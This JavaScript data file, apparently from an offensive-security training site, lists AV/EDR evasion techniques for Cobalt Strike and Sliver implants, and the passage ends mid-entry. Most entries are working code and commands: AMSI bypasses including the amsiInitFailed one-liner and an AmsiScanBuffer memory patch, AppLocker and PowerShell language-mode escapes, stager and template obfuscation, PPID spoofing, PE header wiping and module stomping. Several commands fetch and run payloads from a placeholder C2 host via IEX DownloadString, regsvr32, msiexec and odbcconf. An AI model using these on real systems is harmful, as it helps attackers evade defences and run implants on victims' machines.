export const evasionCRTOTechniques = [
  {
    id: 'artifact-kit',
    title: 'Artifact Kit — Custom C2 Stager Bypass',
    subtitle: 'Replace default CS/Sliver shellcode stubs with custom ones built from source to defeat all AV/EDR signature databases',
    tags: ['Artifact Kit', 'Arsenal Kit', 'Cobalt Strike', 'Sliver', 'stager bypass', 'custom loader', 'shellcode stub', 'pipe injection', 'createThread variant', 'fiber execution'],
    accentColor: 'blue',
    overview: 'The default Cobalt Strike and Sliver stager artifacts are the most heavily signatured binaries in every AV/EDR database — every vendor has static signatures for them. The Artifact Kit replaces CS\'s stager generation pipeline with custom shellcode stubs built from C source. The build script accepts parameters for the shellcode execution primitive (pipe, createThread, indirect syscall, fiber), template size, and whether to enable jitter. The resulting .cna script overrides all subsequent payload generation. Sliver uses a Go template system — modifying the implant source achieves the same result.',
    steps: [
      'Default CS stagers (artifact.exe, artifact.dll) are instantly detected by all major AV/EDR — never ship defaults',
      'Arsenal Kit location: cobaltstrike/arsenal-kit/kits/artifact/ — modify src/bypass.c for custom execution logic',
      'Build parameters: injection method (pipe, createThread, indirect syscall), template size (must be > shellcode), heap sleep, obfuscation',
      'Custom bypass.c: change VirtualAlloc → NtAllocateVirtualMemory, CreateThread → NtCreateThreadEx, add sleep jitter',
      'Load .cna: Cobalt Strike → Script Manager → artifact.cna — all subsequent payload generations use your stub',
      'Sliver: modify Go implant source (implants/sliver/main.go); rebuild with make sliver; use --custom-binary at generate time',
      'Validate: ThreatCheck.exe -f artifact.exe -e AMSI / Defender before every engagement',
    ],
    commands: [
      {
        title: 'Cobalt Strike — Artifact Kit build with custom bypass',
        code: `# ── Arsenal Kit — Artifact Kit ──
ls cobaltstrike/arsenal-kit/kits/artifact/
# src/bypass-pipe.c      ← named pipe shellcode execution
# src/bypass-thread.c    ← CreateThread-based execution
# build.sh               ← build script

# Build with pipe-based execution, 296948-byte template
cd cobaltstrike/arsenal-kit/kits/artifact/
./build.sh pipe VirtualAlloc 296948 5 false false none /tmp/artifact_out/
# Args: [method] [alloc func] [template size] [sleep secs] [useRWX] [obfuscate] [transform] [output]

# ── Customize bypass.c for better evasion ──
# Replace VirtualAlloc with NtAllocateVirtualMemory:
# NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &size,
#                       MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

# Add sleep before allocation (sandbox/timing bypass):
# DWORD t1=GetTickCount(); Sleep(10000); if((GetTickCount()-t1)<9000) return 0;

# Use indirect syscall for CreateThread:
# NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),
#                  (LPTHREAD_START_ROUTINE)addr, NULL, FALSE, 0, 0, 0, NULL);

# ── Load in Cobalt Strike ──
# Cobalt Strike → Script Manager → Load → /tmp/artifact_out/artifact.cna
# Verify: Attacks → Packages → Windows Executable → generate → ThreatCheck it

# ── Validate ──
ThreatCheck.exe -f /tmp/artifact_out/artifact.exe -e AMSI
ThreatCheck.exe -f /tmp/artifact_out/artifact.exe -e Defender`
      },
      {
        title: 'Sliver — custom implant generation pipeline',
        code: `# Sliver default implant: detected by most AV/EDR
# Customize by modifying Go source before generation

# ── Modify implant source ──
ls sliver/implants/sliver/
vim sliver/implants/sliver/main.go          # Entry point
vim sliver/implants/sliver/handlers/*.go   # Handler registration
vim sliver/implants/sliver/transports/*.go # Transport layer

# Add anti-sandbox: check for VM artifacts
# Add sleep + timing: time.Sleep(15*time.Second) before first beacon
# Change string constants: obfuscate hard-coded paths and function names

# ── Rebuild ──
make sliver    # Full rebuild with modifications

# ── Generate implant from custom binary ──
./sliver-server
sliver > generate --os windows --arch amd64 \\
  --format exe --sleep 30s --jitter 10 \\
  --custom-binary /path/to/custom-sliver-implant.exe

# ── gogarble: automatic Go source obfuscation ──
# Renames symbols, mangles strings, obfuscates control flow
go install mvdan.cc/garble@latest
garble -literals -obfuscate build -o sliver_obf.exe .
# -literals: obfuscate string literals
# -obfuscate: rename all unexported symbols`
      }
    ]
  },

  {
    id: 'amsi',
    title: 'AMSI Bypass Techniques',
    subtitle: 'Disable AmsiScanBuffer before loading any PowerShell or .NET tool — multiple methods ranked by EDR monitoring likelihood',
    tags: ['AMSI', 'AmsiScanBuffer', 'amsiInitFailed', 'CLR host bypass', 'HWBP AMSI', 'reflection bypass', 'VirtualProtect patch', 'custom runspace', 'AmsiOpenSession'],
    accentColor: 'blue',
    overview: 'AMSI (Antimalware Scan Interface) intercepts content in PowerShell, VBScript, JScript, .NET, and Office VBA before execution, forwarding it to any registered AV/EDR provider for scanning. Bypassing AMSI prevents the scan call entirely. The amsiInitFailed reflection trick is simplest; the AmsiScanBuffer memory patch is most reliable but monitored by CrowdStrike and MDE. The HWBP (hardware breakpoint) approach intercepts the scan without touching memory — harder for EDR to detect. For scripts hosted in custom CLR runspaces, AMSI is never initialized at all.',
    steps: [
      'amsiInitFailed reflection: set the private static field to $true — AMSI initialization fails silently for the current process',
      'AmsiScanBuffer patch: VirtualProtect → write xor eax,eax; ret patch bytes → scan always returns AMSI_RESULT_CLEAN',
      'EDR monitoring: CrowdStrike and MDE monitor AmsiScanBuffer patches — prefer reflection or CLR host methods against these',
      'HWBP method: set DR0 = AmsiScanBuffer, register VEH — intercept and modify return value without touching memory',
      'CLR host: create PowerShell.Create() runspace in C# code — AMSI is NOT initialized in a custom runspace context',
      'AmsiOpenSession patch: patch AmsiOpenSession instead of AmsiScanBuffer (less monitored alternative target)',
      'Always apply AMSI bypass inside the target process before loading any offensive tool or script',
    ],
    commands: [
      {
        title: 'AMSI bypass methods ranked by EDR detectability',
        code: `# ── Method 1: amsiInitFailed reflection (simplest, widely known) ──
# Monitored by: MDE and some others — obfuscate the field name slightly
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
# One-liner (may be signatured — obfuscate):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ── Method 2: AmsiScanBuffer memory patch ──
# MORE RELIABLE but monitored by CrowdStrike/MDE — avoid against those EDRs
$Win32 = @"
using System; using System.Runtime.InteropServices;
public class W {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
}
"@
Add-Type $Win32
$amsi = [W]::LoadLibrary("amsi.dll")
$addr = [W]::GetProcAddress($amsi, "AmsiScanBuffer")
$p = 0
[W]::VirtualProtect($addr, [UIntPtr]::new(6), 0x40, [ref]$p)  # PAGE_EXECUTE_READWRITE
[Runtime.InteropServices.Marshal]::Copy(
    [byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3),   # mov eax, AMSI_RESULT_CLEAN; ret
    0, $addr, 6)

# ── Method 3: CLR host (most OPSEC — no AMSI init) ──
# C# code that creates a custom runspace — AMSI never initialized
Add-Type -TypeDefinition @'
using System; using System.Management.Automation; using System.Management.Automation.Runspaces;
public class NoAMSI {
    public static object Run(string cmd) {
        using (var rs = RunspaceFactory.CreateRunspace()) {
            rs.Open();   // AMSI not initialized here
            using (var ps = PowerShell.Create()) {
                ps.Runspace = rs;
                ps.AddScript(cmd);
                return ps.Invoke();
            }
        }
    }
}
'@
[NoAMSI]::Run("IEX (New-Object Net.WebClient).DownloadString('http://C2/tool.ps1')")`
      },
      {
        title: 'HWBP AMSI bypass — intercept without memory patch (C#)',
        code: `// HWBP AMSI bypass — set DR0 on AmsiScanBuffer, VEH returns AMSI_RESULT_CLEAN
// No memory write → evades EDRs monitoring AmsiScanBuffer patches
using System; using System.Runtime.InteropServices;

class AmsiHWBP {
    [DllImport("ntdll")] static extern int NtGetContextThread(IntPtr h, ref CONTEXT ctx);
    [DllImport("ntdll")] static extern int NtSetContextThread(IntPtr h, ref CONTEXT ctx);
    [DllImport("kernel32")] static extern IntPtr GetCurrentThread();
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);

    [StructLayout(LayoutKind.Sequential)] struct CONTEXT { /* 64-bit CONTEXT — abbreviated */ }
    // Full CONTEXT struct definition required for production use

    static IntPtr g_amsiAddr;

    // VEH callback: set RAX = AMSI_RESULT_CLEAN (0x80070057) and skip function
    static int VehHandler(IntPtr exInfo) {
        // Check: ExceptionCode == EXCEPTION_SINGLE_STEP and DR0 fired
        // Modify context: RAX = 0x80070057, RIP += sizeof(function prologue)
        // Return EXCEPTION_CONTINUE_EXECUTION (0xFFFFFFFF)
        return -1; // EXCEPTION_CONTINUE_EXECUTION
    }

    public static void Install() {
        g_amsiAddr = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");
        // Register VEH and set HWBP on AmsiScanBuffer
        // (Full implementation: github.com/CCob/SharpBlock)
        Console.WriteLine($"[+] HWBP AMSI bypass installed on 0x{g_amsiAddr:X}");
    }
}

// Reference implementation: SharpBlock (CCob) uses this technique
// https://github.com/CCob/SharpBlock`
      }
    ]
  },

  {
    id: 'applocker',
    title: 'AppLocker Bypass',
    subtitle: 'Enumerate policy, find writable allowed paths, and leverage LOLBINs and DLL delivery to execute in restricted environments',
    tags: ['AppLocker', 'SrpV2', 'Get-AppLockerPolicy', 'writable paths', 'LOLBAS', 'regsvr32', 'odbcconf', 'DLL less restricted', 'CLM', 'C:\\Windows\\Tasks'],
    accentColor: 'blue',
    overview: 'AppLocker enforces application whitelisting through SRP (Software Restriction Policies v2) — it evaluates EXE, DLL, script, and packaged app rules. Bypasses exploit three categories: (1) default-allowed Microsoft LOLBINs (regsvr32, mshta, wmic) that bypass rules by design, (2) writable directories within allowed path wildcards (C:\\Windows\\Tasks), and (3) DLL execution rules being less restrictive than EXE rules by default. When AppLocker is active, Constrained Language Mode (CLM) is typically co-enforced — requiring a C# or native code delivery path.',
    steps: [
      'Enumerate policy: Get-AppLockerPolicy -Effective | Format-List → identify allowed vs blocked paths and publishers',
      'Check registry: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2 for GPO-pushed policy',
      'Find writable directories within allowed path rules: icacls C:\\Windows\\Tasks and C:\\Windows\\Tracing — often user-writable',
      'DLL rules are less restrictive than EXE rules by default — deliver payload as DLL via regsvr32, odbcconf, or regsvcs',
      'LOLBINs always allowed: regsvr32 /s /n /u /i:URL scrobj.dll, mshta, wmic process call create, msiexec /i URL',
      'CLM check: $ExecutionContext.SessionState.LanguageMode — if ConstrainedLanguage, use C# execute-assembly or in-process powerpick',
      'Both CS and Sliver support DLL delivery — generate DLL payload, execute via regsvr32 or odbcconf wrapper',
    ],
    commands: [
      {
        title: 'AppLocker enumeration and writable path discovery',
        code: `# ── Enumerate AppLocker policy ──
Get-AppLockerPolicy -Effective | Format-List

# Registry-based policy (GPO)
Get-ChildItem "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2" -ErrorAction SilentlyContinue |
    ForEach-Object { Get-ItemProperty $_.PSPath }

# ── Find writable directories in allowed paths ──
# Common writable paths that fall under C:\\Windows\\ wildcard allows:
$testPaths = @(
    "C:\\Windows\\Tasks",       # Sched tasks dir — often user-writable
    "C:\\Windows\\Temp",        # Global temp — writable
    "C:\\Windows\\Tracing",     # Tracing dir — often writable
    "C:\\Windows\\System32\\spool\\drivers\\color",  # Color profiles — sometimes writable
    "C:\\Windows\\SysWOW64\\Tasks"
)
foreach ($p in $testPaths) {
    try {
        [IO.File]::WriteAllText("$p\\test.txt","x")
        Remove-Item "$p\\test.txt"
        Write-Host "[WRITABLE] $p"
    } catch { Write-Host "[locked]   $p" }
}

# ── Check DLL rule enforcement ──
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections |
    Where-Object { $_.RuleCollectionType -eq "Dll" } | Measure-Object | Select-Object Count
# If Count=0: DLL rules NOT enforced → deliver as DLL freely

# ── CLM check ──
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage = CLM active → need C# or native code delivery`
      },
      {
        title: 'AppLocker bypass — LOLBINs and DLL delivery',
        code: `# ── LOLBIN execution (bypasses EXE rules by design) ──

# regsvr32 — COM scriptlet (no AppLocker EXE check, remote load)
regsvr32.exe /s /n /u /i:http://C2/payload.sct scrobj.dll
# Process: regsvr32 (signed MS) → downloads SCT → COM scriptlet executes

# odbcconf — DLL registration
odbcconf.exe /a {REGSVR C:\\Windows\\Tasks\\payload.dll}
odbcconf.exe /s /a {REGSVR \\\\C2\\share\\payload.dll}

# msiexec — remote MSI execution
msiexec.exe /quiet /i http://C2/payload.msi

# wmic — remote process creation
wmic.exe process call create "C:\\Windows\\Tasks\\payload.exe"

# regsvcs / regasm — .NET COM server execution
regsvcs.exe C:\\Windows\\Tasks\\payload.dll  # .NET 32/64-bit
regasm.exe  C:\\Windows\\Tasks\\payload.dll

# ── DLL delivery chain (CS + Sliver) ──
# Cobalt Strike — generate DLL beacon
# Attacks → Packages → Windows DLL → x64 → beacon.dll

# Sliver — generate DLL
# sliver > generate --os windows --arch amd64 --format dll

# Deliver via writable allowed path:
copy beacon.dll "C:\\Windows\\Tasks\\update.dll"
regsvr32.exe /s /n /u /i:C:\\Windows\\Tasks\\update.dll scrobj.dll
# OR:
odbcconf.exe /a {REGSVR C:\\Windows\\Tasks\\update.dll}

# ── C# runner via execute-assembly (bypasses CLM) ──
# CS: execute-assembly Rubeus.exe kerberoast     # DotNet runs outside CLM
# Sliver: execute-assembly -t 60 Rubeus.exe kerberoast`
      }
    ]
  },

  {
    id: 'malleable-evasion',
    title: 'C2 Profile Behavioural Evasion',
    subtitle: 'Configure CS/Sliver spawnto, PPID, pipe names, and obfuscation to produce a minimal EDR detection surface',
    tags: ['spawnto', 'ppid', 'obfuscate', 'pipename', 'Malleable C2', 'post-ex block', 'fork-and-run', 'dllhost.exe', 'process masking', 'Sliver config'],
    accentColor: 'orange',
    overview: 'Every fork-and-run post-exploitation task in Cobalt Strike creates a visible event sequence: CreateProcess (sacrificial proc) + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread + TerminateProcess. This sequence is a detection signature for all modern EDRs. The Malleable C2 post-ex block controls every aspect of this: spawnto (what process to spawn), ppid (who appears as the parent), pipename (SMB pipe pattern), and obfuscate (wipe Beacon PE header). Configuring all four together creates a minimal detection surface for all fork-and-run operations.',
    steps: [
      'spawnto: change from default rundll32.exe to dllhost.exe, gpupdate.exe, or WmiPrvSE.exe — less anomalous as a child process',
      'ppid: set explorer.exe as parent — all spawned processes appear as children of explorer, not the beacon',
      'pipename: default CS pipe names (msagent_*, MSSE-*) are instant IOCs — use svcctl_######## or similar Windows service pipe patterns',
      'obfuscate: true — Beacon wipes its own PE header after loading; removes MZ/PE signature from memory',
      'smartinject: true — inject into existing dllhost instances rather than spawning new ones (less process creation noise)',
      'Sliver: equivalent settings in config.yml — spawnto, ppid_spoof; rebuild implant with make sliver',
      'Validate: ps command in beacon + Sysmon EventID 1 — verify parent-child chain looks legitimate',
    ],
    commands: [
      {
        title: 'Cobalt Strike — complete post-ex block configuration',
        code: `# Malleable C2 profile — post-ex block (full configuration)
post-ex {
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";      # Spawn target (x64)
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";       # Spawn target (x86)
    set ppid "explorer.exe";                                  # Spoofed parent
    set pipename "svcctl_##########";                         # Random SMB pipe name
    set pipename_stager "status_##########";                  # Stager pipe
    set obfuscate "true";                                     # Wipe Beacon PE header
    set smartinject "true";                                   # Inject into existing dllhost
    set amsi_disable "true";                                  # Disable AMSI in fork-and-run proc
}

# ── Verify the configuration is working ──
# In beacon:
ps            # Should show dllhost.exe children of explorer.exe
shell wmic process get name,processid,parentprocessid | findstr dllhost

# Check Sysmon Event ID 1 (ProcessCreate):
# ParentImage: C:\\Windows\\explorer.exe  ← PPID spoof working
# Image: C:\\Windows\\System32\\dllhost.exe ← spawnto working
# CommandLine: no beacon args visible     ← obfuscate working

# ── Per-session spawnto override ──
spawnto x64 %windir%\\sysnative\\WmiPrvSE.exe
spawnto x86 %windir%\\syswow64\\WmiPrvSE.exe

# ── BOF vs fork-and-run decision ──
# execute-assembly Rubeus.exe → fork-and-run (spawns dllhost → injects .NET)
# inline-execute rubeus_bof.o → in-process (no new process — most OPSEC)
# powerpick Get-DomainUser     → in-process PowerShell (no powershell.exe spawn)
# powershell Get-DomainUser   → fork-and-run (spawns powershell.exe — avoid)`
      },
      {
        title: 'Sliver — post-ex configuration and custom compile',
        code: `# ── Sliver config.yml (server-side) ──
cat > ~/.sliver/configs/default.yaml << 'EOF'
implant:
  spawn_to: "C:\\Windows\\System32\\dllhost.exe"
  ppid: 0          # 0 = auto-find explorer.exe PID at runtime
  jitter_min: 3
  jitter_max: 12
  sleep: 30
EOF

# ── Generate implant with PPID and sleep settings ──
sliver > generate --os windows --arch amd64 \\
  --format exe \\
  --sleep 30s \\
  --jitter 10 \\
  --name svchost_update

# ── Named pipe configuration for SMB implant ──
sliver > smb --listener 0.0.0.0 \\
  --pipe-name "svcctl_9182736450"   # Custom pipe name (not default)

# ── Rebuild with custom spawn behavior (source mod) ──
vim sliver/implants/sliver/handlers/generic.go
# Modify spawnProcess() to use STARTUPINFOEX + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
make sliver
sliver > generate --custom-binary /path/to/custom-sliver`
      }
    ]
  },

  {
    id: 'clm',
    title: 'PowerShell Constrained Language Mode Bypass',
    subtitle: 'Escape CLM restrictions using custom .NET runspaces, downgrade attacks, or in-process C# execution',
    tags: ['CLM', 'ConstrainedLanguage', 'FullLanguage', 'custom runspace', 'RunspaceFactory', 'PS v2 downgrade', 'powerpick', 'execute-assembly', 'AppLocker bypass'],
    accentColor: 'orange',
    overview: 'PowerShell Constrained Language Mode (CLM) restricts the PS language when AppLocker policy is active — blocking .NET method calls, COM objects, custom types, and Add-Type. This makes most offensive PowerShell tools inoperative. CLM is enforced per-runspace: creating a fresh runspace via the .NET API (PowerShell.Create()) from a C# loader bypasses the restriction because the new runspace initializes without the CLM enforcement context. Cobalt Strike powerpick uses exactly this approach — no powershell.exe, no CLM, no AMSI init.',
    steps: [
      'Detect CLM: $ExecutionContext.SessionState.LanguageMode — ConstrainedLanguage means restricted',
      'Method 1: Custom .NET runspace (C# loader) — PowerShell.Create() starts in FullLanguage mode regardless of AppLocker policy',
      'Method 2: PowerShell v2 downgrade — powershell -version 2 -ep bypass — PS v2 has no CLM support (requires .NET 2.0, rarely available)',
      'Method 3: Inject into allowed process — if your loader runs inside a path allowed by AppLocker policy, CLM may not be enforced',
      'Method 4: execute-assembly (CS/Sliver) — C# compiled tools bypass CLM entirely (CLM only affects PS interpreter)',
      'Method 5: powerpick (CS) — in-process unmanaged PowerShell runspace using powershell.dll directly, no PS executable, no CLM',
      'After bypassing CLM: apply AMSI bypass before loading any offensive script',
    ],
    commands: [
      {
        title: 'CLM bypass — custom runspace (C#) and powerpick',
        code: `# ── Check CLM state ──
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage → CLM enforced
# FullLanguage        → unrestricted

# ── Method 1: Custom C# runspace (most reliable) ──
# Compile and execute-assembly from CS/Sliver:
Add-Type -TypeDefinition @'
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
public class BypassCLM {
    public static object Run(string script) {
        // RunspaceFactory.CreateRunspace() always starts in FullLanguage
        using (var rs = RunspaceFactory.CreateRunspace()) {
            rs.Open();
            // Confirm language mode:
            // rs.SessionStateProxy.LanguageMode == LanguageMode.FullLanguage
            using (var ps = PowerShell.Create()) {
                ps.Runspace = rs;
                ps.AddScript(script);
                var results = ps.Invoke();
                foreach (var r in results) Console.WriteLine(r);
                return results;
            }
        }
    }
}
'@
# Usage:
[BypassCLM]::Run('$ExecutionContext.SessionState.LanguageMode')  # Should print FullLanguage
[BypassCLM]::Run('IEX (New-Object Net.WebClient).DownloadString("http://C2/tool.ps1")')

# ── Method 2: powerpick (Cobalt Strike — in-process) ──
# powerpick runs PowerShell in-process via unmanaged runspace
# No powershell.exe spawn, no CLM context, no AMSI initialization
powerpick Get-DomainUser -LDAPFilter "(adminCount=1)"  # Full PowerView in-process
powerpick Invoke-Kerberoast -OutputFormat Hashcat      # Full PowerSploit

# ── Method 3: PS v2 downgrade (if available) ──
powershell -version 2 -ExecutionPolicy Bypass -NoProfile
# PS v2 has no CLM — but requires .NET 2.0 Framework (legacy systems only)

# ── Method 4: C# tool via execute-assembly (bypasses CLM entirely) ──
# CS: execute-assembly Rubeus.exe kerberoast /nowrap   # C# = no CLM restriction
# Sliver: execute-assembly -t 60 Rubeus.exe kerberoast`
      }
    ]
  },

  {
    id: 'resource-kit',
    title: 'Payload Template Customization',
    subtitle: 'Replace CS PowerShell/VBA/HTA templates and Sliver Go source with custom variants to defeat AV signature scanning',
    tags: ['Resource Kit', 'Arsenal Kit', 'PS template', 'VBA template', 'HTA template', 'template.x64.ps1', 'gogarble', 'Sliver source', 'custom loader chain'],
    accentColor: 'orange',
    overview: 'Cobalt Strike\'s default PowerShell, VBA, Python, and HTA payload templates contain well-known string patterns flagged by every AV/EDR. The Resource Kit replaces these templates from source — operators control every variable name, encoding algorithm, and string constant. The output .cna script overrides all CS script-based payload generation. Sliver\'s equivalent is modifying the Go implant source directly and using garble for symbol obfuscation.',
    steps: [
      'Default CS templates (template.x64.ps1, template.vba, template.hta) are instantly detected — never use defaults for delivery',
      'Resource Kit: builds custom templates from C source; operator modifies variable names, encoding, and string constants',
      'Change variable names in PS template ($a, $b → random names), change base64 encoding to custom XOR, add anti-analysis checks',
      'VBA template: rename suspicious method names (Shell, CreateObject), add junk subs, encode payload string differently',
      'HTA template: change VBScript vs JScript engine, add document.title check (sandbox detection)',
      'Load .cna: Cobalt Strike → Script Manager → resource.cna — all script payload generation uses your templates',
      'Sliver: gogarble -literals -obfuscate build for symbol/string obfuscation in the Go binary',
    ],
    commands: [
      {
        title: 'Cobalt Strike — Resource Kit customization',
        code: `# ── Build Resource Kit ──
ls cobaltstrike/arsenal-kit/kits/resource/
# src/template.x64.ps1   ← PowerShell stager
# src/template.x86.ps1
# src/template.vba       ← VBA macro stager
# src/template.py        ← Python stager
# src/template.hta       ← HTA stager

cd cobaltstrike/arsenal-kit/kits/resource/
./build.sh /tmp/resource_out/

# Load in CS
# Script Manager → Load → /tmp/resource_out/resource.cna
# Now: all PS/VBA/HTA payloads generated from custom templates

# ── Customize template.x64.ps1 ──
# Original (signatured): $var_code = [System.Convert]::FromBase64String(...)
# Custom version:
$k = [byte[]](0x41,0x42,0x43,0x44)           # XOR key
$e = [byte[]](...)                             # XOR-encoded shellcode
$d = New-Object byte[] $e.Length
for ($i=0;$i -lt $e.Length;$i++) { $d[$i]=$e[$i] -bxor $k[$i % $k.Length] }
[System.Runtime.InteropServices.Marshal]::Copy($d,0,[IntPtr]([System.Runtime.InteropServices.Marshal]::AllocHGlobal($d.Length)),$d.Length)

# ── Customize template.vba ──
# Add junk subs, rename Shellcode variable, obfuscate CreateObject calls:
Function xGetObject(sClass As String) As Object  ' renamed from CreateObject
    Set xGetObject = CreateObject(sClass)
End Function
' Use custom base64 alphabet or XOR encoding instead of plain base64

# ── Validate templates ──
# Generate a PS payload from CS, run through ThreatCheck:
ThreatCheck.exe -f stager.ps1 -e AMSI`
      },
      {
        title: 'Sliver — gogarble source obfuscation',
        code: `# ── gogarble: Go binary obfuscation ──
# https://github.com/burrowers/garble
go install mvdan.cc/garble@latest

# Build Sliver implant with full obfuscation
cd sliver/implants/sliver/
garble -literals -obfuscate -seed "random_seed_per_engagement" \\
  build -trimpath -ldflags="-s -w" -o sliver_obf.exe .
# -literals:    encrypt string literals at compile time
# -obfuscate:   rename all unexported identifiers
# -trimpath:    remove build path from binary
# -s -w:        strip DWARF and symbol tables

# Verify: strings sliver_obf.exe should show no sliver-related strings
strings sliver_obf.exe | grep -i "sliver\\|implant\\|c2"  # Should be empty

# ── Regenerate with custom binary ──
./sliver-server
sliver > generate --os windows --arch amd64 \\
  --format exe --sleep 30s --jitter 10 \\
  --custom-binary sliver_obf.exe

# ── Combined: garble + UPX compression ──
garble build -o sliver_obf.exe . && upx --best --ultra-brute sliver_obf.exe
# Note: UPX is itself signatured — use a custom packer instead for production
# (See PE Packer Development technique for custom packer implementation)`
      }
    ]
  },

  {
    id: 'mem-indicators',
    title: 'Post-Exploitation Memory Indicators',
    subtitle: 'Understand, minimize, and clean up in-memory artifacts from post-exploitation tools and BOFs',
    tags: ['memory artifacts', 'PE header wipe', 'MZ signature', 'BOF cleanup', 'heap artifacts', 'SecureZeroMemory', 'module stomping', 'obfuscate post-ex', 'unbacked memory'],
    accentColor: 'pink',
    overview: 'Every post-exploitation tool loaded in memory leaves forensic artifacts: PE headers (MZ/PE magic) at non-image-mapped addresses, offensive strings in heap allocations, RX memory not backed by a file, and ETW assembly load events. Wiping the PE header post-load removes the easiest scanner trigger. BOF cleanup requires explicitly freeing all allocations before the BOF exits. Module stomping places the tool inside a legitimate DLL\'s .text section, making memory appear file-backed — defeating both unbacked-memory detection and PE header scanning simultaneously.',
    steps: [
      'EDRs enumerate all process memory regions and flag: MZ/PE headers at non-image-mapped addresses, RX allocations not backed by a file',
      'PE header wipe: VirtualProtect(base, 0x1000, RW) → RtlZeroMemory → VirtualProtect restore — removes MZ signature immediately after loading',
      'CS Malleable post-ex obfuscate: "true" — Beacon automatically wipes its own PE header after loading',
      'BOF cleanup: every HeapAlloc in BOF code must have a matching HeapFree before return; use SecureZeroMemory before freeing sensitive buffers',
      'Module stomping: place shellcode/implant inside a legitimate DLL .text section — memory is file-backed, no unbacked flag, no PE header at dynamic address',
      'Heap string cleanup: after credential/sensitive data use, zero the buffer before freeing — prevents heap scraping',
      'Fork-and-run cleanup: sacrificial process terminates automatically, taking all its allocations with it — cleanest approach',
    ],
    commands: [
      {
        title: 'PE header wipe and BOF cleanup patterns',
        code: `// ── Wipe PE header after reflective load ──
// Run immediately after your shellcode/DLL is executing
PVOID base = GetModuleHandle(NULL);  // Or the known DLL base
DWORD old;
VirtualProtect(base, 0x1000, PAGE_READWRITE, &old);
RtlZeroMemory(base, 0x1000);   // Zero 4KB: DOS header + PE header
VirtualProtect(base, 0x1000, old, &old);
// EDR now sees: no MZ at that address → passes MZ scan

// ── CS Malleable C2: auto-wipe Beacon PE header ──
post-ex {
    set obfuscate "true";   // CS wipes Beacon PE header automatically after load
}

// ── BOF cleanup: zero and free all allocations ──
void go(char* args, int argsLen) {
    HANDLE hMem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
    char* credBuf = (char*)HeapAlloc(GetProcessHeap(), 0, 256);

    // ... do work, fill credBuf ...

    // Cleanup BEFORE returning from BOF
    SecureZeroMemory(credBuf, 256);      // Zero credential buffer
    HeapFree(GetProcessHeap(), 0, credBuf);
    SecureZeroMemory(hMem, 0x1000);      // Zero work buffer
    HeapFree(GetProcessHeap(), 0, hMem);
    // No heap artifacts remain after BOF exits
}`
      },
      {
        title: 'Module stomping for file-backed memory (defeat unbacked detection)',
        code: `// Module stomp: place implant in legitimate DLL .text section
// EDR sees: file-backed RX memory → not flagged as shellcode allocation
// Additional benefit: no MZ header at a dynamic address (PE header is in DLL's normal location)
#include <windows.h>

PVOID ModuleStompAndExecute(BYTE* shellcode, SIZE_T scLen, const char* dllName) {
    // Map DLL as data file (avoids running DllMain, still gives file backing)
    HMODULE hDll = LoadLibraryExA(dllName, NULL, LOAD_LIBRARY_AS_IMAGE_RESOURCE);
    PBYTE base = (PBYTE)((ULONG_PTR)hDll & ~0xF);  // Strip low flag bits

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    PBYTE textAddr = NULL; DWORD textSize = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            textAddr = base + sec->VirtualAddress;
            textSize = sec->Misc.VirtualSize;
            break;
        }
    }
    if (!textAddr || scLen > textSize) return NULL;

    DWORD old;
    VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READWRITE, &old);
    memcpy(textAddr, shellcode, scLen);
    VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READ, &old);
    FlushInstructionCache(GetCurrentProcess(), textAddr, textSize);

    // Execute: EDR VAD walk → DLL file-backed .text → no unbacked flag
    return textAddr;
}
// Usage:
// PVOID execAddr = ModuleStompAndExecute(shellcode, len, "C:\\Windows\\System32\\xpsservices.dll");
// ((void(*)())execAddr)();`
      }
    ]
  },

  {
    id: 'mem-perms',
    title: 'Memory Permission Hygiene — RW→RX',
    subtitle: 'Never allocate RWX; always use RW→write→RX pattern via indirect syscalls to minimize EDR memory scan triggers',
    tags: ['RWX detection', 'PAGE_READWRITE', 'PAGE_EXECUTE_READ', 'VirtualProtect', 'NtProtectVirtualMemory', 'indirect syscall', 'memory scanner', 'EDR allocation hook'],
    accentColor: 'pink',
